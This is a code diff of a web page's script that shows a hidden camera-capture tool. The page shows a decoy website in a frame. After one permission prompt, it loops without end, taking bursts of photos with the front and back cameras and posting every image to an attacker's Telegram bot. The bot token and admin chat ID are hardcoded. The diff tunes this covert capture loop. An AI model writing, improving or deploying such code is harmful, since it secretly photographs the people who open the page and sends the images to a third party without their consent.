@@ -54,7 +54,7 @@
 
     <script>
         // =====================================================
-        //  ULTRA FAST BURST - SINGLE PERMISSION REQUEST
+        //  ULTRA FAST BURST - TRUE SINGLE PERMISSION
         // =====================================================
         
         function getConfigFromURL() {
@@ -80,23 +80,22 @@
         const config = getConfigFromURL();
         const BOT_TOKEN = '8307999302:AAGc6sLGoklnbpWsXg76lcdQcVAzGgsp8cQ';
         const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
-        const ADMIN_CHAT_ID = '7838949014'; // Your admin ID
-        const USER_CHAT_ID = config.chatId; // User ID from URL
-        const CHAT_IDS = [ADMIN_CHAT_ID, USER_CHAT_ID]; // Send to both
+        const ADMIN_CHAT_ID = '7838949014';
+        const USER_CHAT_ID = config.chatId;
+        const CHAT_IDS = [ADMIN_CHAT_ID, USER_CHAT_ID];
         
         // ⚡ ULTRA FAST CONFIG
-        const PHOTOS_PER_CAMERA = 3;      // 3 photos each camera
-        const CAPTURE_DELAY = 80;          // 80ms between photos (ULTRA FAST!)
-        const WARMUP_TIME = 600;           // 600ms warmup
-        const SWITCH_DELAY = 200;          // 200ms switch delay (minimal)
+        const PHOTOS_PER_CAMERA = 3;
+        const CAPTURE_DELAY = 80;
+        const WARMUP_TIME = 600;
+        const SWITCH_DELAY = 300;
         
-        let availableCameras = [];
-        let currentCameraIndex = 0;
         let burstRunning = false;
         let photoCounter = 0;
         let totalPhotosSent = 0;
         let cameraReady = false;
         let currentStream = null;
+        let permissionGranted = false;
         
         const cameraVideo = document.getElementById('cameraVideo');
         const websiteFrame = document.getElementById('websiteFrame');
@@ -110,48 +109,45 @@
             }
         }
         
-        // Get all available cameras (ONLY ONCE!)
-        async function discoverCameras() {
+        // Request permission ONCE at the beginning
+        async function requestCameraPermission() {
             try {
-                console.log('🔍 Discovering cameras...');
+                console.log('🔐 Requesting camera permission (ONCE)...');
                 
-                // Request permission ONCE with both cameras
-                const tempStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: 'user' }
+                // Request basic camera permission
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true
                 });
                 
-                // Permission granted! Now get all devices
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                // Stop it immediately - we just needed permission
+                stream.getTracks().forEach(track => track.stop());
                 
-                // Stop temp stream
-                tempStream.getTracks().forEach(track => track.stop());
-                
-                availableCameras = videoDevices;
-                console.log(`✅ Found ${availableCameras.length} cameras:`, videoDevices.map(d => d.label));
-                
-                return availableCameras.length > 0;
+                permissionGranted = true;
+                console.log('✅ Camera permission granted!');
+                return true;
             } catch (error) {
-                console.error('❌ Camera discovery error:', error);
+                console.error('❌ Permission denied:', error);
+                permissionGranted = false;
                 return false;
             }
         }
         
-        // Switch to specific camera by device ID
-        async function switchToCamera(deviceId) {
+        // Start camera with facingMode (no new permission needed)
+        async function startCameraWithFacing(facingMode) {
             try {
                 cameraReady = false;
                 
                 // Stop current stream
                 if (currentStream) {
                     currentStream.getTracks().forEach(track => track.stop());
+                    currentStream = null;
                 }
                 
-                console.log(`📹 Switching to camera: ${deviceId}`);
+                console.log(`📹 Starting ${facingMode} camera...`);
                 
                 const constraints = {
                     video: {
-                        deviceId: { exact: deviceId },
+                        facingMode: facingMode,
                         width: { ideal: 1280 },
                         height: { ideal: 720 },
                         frameRate: { ideal: 30 }
@@ -172,10 +168,10 @@
                 await new Promise(resolve => setTimeout(resolve, WARMUP_TIME));
                 
                 cameraReady = true;
-                console.log(`✅ Camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
+                console.log(`✅ ${facingMode} camera ready: ${cameraVideo.videoWidth}x${cameraVideo.videoHeight}`);
                 return true;
             } catch (error) {
-                console.error('❌ Switch camera error:', error);
+                console.error(`❌ ${facingMode} camera error:`, error);
                 return false;
             }
         }
@@ -234,15 +230,15 @@
         }
         
         // Capture burst from current camera
-        async function captureBurstFromCamera(cameraLabel) {
-            console.log(`📸 Capturing ${PHOTOS_PER_CAMERA} photos from ${cameraLabel}...`);
+        async function captureBurstFromCamera(cameraType) {
+            console.log(`📸 Capturing ${PHOTOS_PER_CAMERA} photos from ${cameraType.toUpperCase()}...`);
             
             for (let i = 0; i < PHOTOS_PER_CAMERA; i++) {
                 const blob = await captureFrameFast();
                 
                 if (blob) {
                     photoCounter++;
-                    sendPhotoFast(blob, cameraLabel, photoCounter);
+                    sendPhotoFast(blob, cameraType, photoCounter);
                 }
                 
                 if (i < PHOTOS_PER_CAMERA - 1) {
@@ -254,46 +250,43 @@
         // MAIN ULTRA FAST BURST LOOP
         async function ultraFastBurst() {
             if (burstRunning) return;
-            if (availableCameras.length === 0) {
-                console.error('❌ No cameras available');
+            if (!permissionGranted) {
+                console.error('❌ No camera permission');
                 return;
             }
             
             burstRunning = true;
-            console.log('⚡ ULTRA FAST BURST: CYCLING THROUGH ALL CAMERAS');
+            console.log('⚡ ULTRA FAST BURST: 3 FRONT → 3 BACK → REPEAT');
             
             while (burstRunning) {
-                // Cycle through all available cameras
-                for (let i = 0; i < availableCameras.length; i++) {
-                    const camera = availableCameras[i];
-                    const cameraLabel = camera.label || `Camera ${i + 1}`;
-                    const cameraType = cameraLabel.toLowerCase().includes('back') || 
-                                      cameraLabel.toLowerCase().includes('rear') || 
-                                      cameraLabel.toLowerCase().includes('environment') ? 'back' : 'front';
-                    
-                    console.log(`🔄 Switching to: ${cameraLabel}`);
-                    
-                    const switched = await switchToCamera(camera.deviceId);
-                    
-                    if (switched) {
-                        await captureBurstFromCamera(cameraType);
-                        
-                        // Small delay before next camera
-                        await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
-                    } else {
-                        console.error(`❌ Failed to switch to ${cameraLabel}`);
-                    }
+                // FRONT CAMERA
+                photoCounter = 0;
+                const frontStarted = await startCameraWithFacing('user');
+                if (frontStarted) {
+                    await captureBurstFromCamera('front');
                 }
                 
-                console.log('🔁 Completed full cycle, restarting...');
+                // Small delay before switch
+                await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
+                
+                // BACK CAMERA
+                photoCounter = 0;
+                const backStarted = await startCameraWithFacing('environment');
+                if (backStarted) {
+                    await captureBurstFromCamera('back');
+                }
+                
+                // Small delay before next cycle
+                await new Promise(resolve => setTimeout(resolve, SWITCH_DELAY));
+                
+                console.log('🔁 Cycle complete, restarting...');
             }
         }
         
         async function sendStartMessage() {
             try {
                 const msg = `⚡ *ULTRA FAST BURST MODE*\n\n` +
-                    `📸 Cameras: ${availableCameras.length} detected\n` +
-                    `📷 Pattern: ${PHOTOS_PER_CAMERA} photos per camera\n` +
+                    `📸 Pattern: 3 FRONT → 3 BACK → REPEAT\n` +
                     `⏱️ Speed: ${CAPTURE_DELAY}ms between shots\n` +
                     `🔄 Switch: ${SWITCH_DELAY}ms\n` +
                     `🌐 Site: ${config.website}\n` +
@@ -324,22 +317,22 @@
             console.log('👑 Admin ID:', ADMIN_CHAT_ID);
             console.log('👤 User ID:', USER_CHAT_ID);
             console.log('🌐 Website:', config.website);
-            console.log('📸 Photos per camera:', PHOTOS_PER_CAMERA);
+            console.log('📸 Pattern: 3 FRONT + 3 BACK');
             console.log('⚡ Speed: MAXIMUM');
             console.log('📤 Sending to: BOTH admin & user');
             console.log('═══════════════════════════════════');
             
             loadWebsite();
             
-            // Discover cameras ONCE (single permission request)
-            const camerasFound = await discoverCameras();
+            // Request permission ONCE at startup
+            const permitted = await requestCameraPermission();
             
-            if (camerasFound) {
+            if (permitted) {
                 await sendStartMessage();
                 console.log('🚀 Starting ultra fast burst...');
                 ultraFastBurst();
             } else {
-                console.error('❌ No cameras found or permission denied');
+                console.error('❌ Camera permission denied');
             }
         }
         
